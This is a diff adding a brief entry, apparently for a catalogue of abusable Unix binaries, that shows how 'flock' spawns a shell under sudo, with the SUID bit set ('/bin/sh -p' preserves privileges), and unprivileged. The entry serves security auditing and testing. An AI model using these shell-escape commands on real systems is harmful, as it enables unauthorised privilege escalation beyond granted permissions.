@@ -1,0 +1,14 @@
+flock
+=====
+
+Shell
+-----
+
+[Sudo]
+    flock -u / /bin/sh
+
+[SUID]
+    flock -u / /bin/sh -p
+
+[Unprivileged]
+    flock -u / /bin/sh
